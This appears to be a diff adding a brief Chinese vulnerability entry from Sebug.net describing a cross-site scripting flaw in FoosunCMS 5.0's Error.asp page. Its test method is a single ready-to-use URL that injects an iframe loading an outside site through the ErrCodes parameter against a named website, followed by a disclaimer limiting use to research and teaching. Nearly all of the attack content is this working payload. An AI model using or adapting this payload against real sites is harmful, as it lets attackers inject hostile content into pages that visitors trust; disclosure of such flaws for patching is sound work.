@@ -1,0 +1,6 @@
+风讯(FoosunCMS) 5.0 Error.asp 错误页跨站脚本漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://www.freecms2008.cn/Foosun500/User/lib/Error.asp?ErrCodes=%3Ciframe%20src=http://www.gohack.org%3E&ErrorUrl=http://www.freecms2008.cn/foosun500/
